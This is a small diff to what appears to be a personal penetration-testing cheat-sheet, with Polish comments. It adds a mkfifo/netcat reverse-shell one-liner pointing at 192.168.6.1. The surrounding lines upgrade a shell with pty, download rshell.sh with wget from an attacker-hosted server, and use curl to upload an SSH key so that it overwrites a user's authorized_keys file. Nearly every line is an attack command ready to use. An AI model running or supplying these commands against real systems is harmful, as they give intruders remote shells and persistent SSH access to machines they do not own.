@@ -4,6 +4,10 @@ python -c ‘import pty; pty.spawn(“/bin/bash”)’
 # SimpleServ
 local: python -m SimpleHTTPServer 1234 - remote: wget http://X.X.X.X:1234/rshell.sh
 
+RS:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.1 8000 >/tmp/f
+
+
 # wysyłanie pliku:
 $ curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/home/user/.ssh/id_rsa.txt" http://192.168.200.249:33414/file-upload -F filename=/home/alfredo/.ssh/authorized_keys
     {"message":"File successfully uploaded"} 
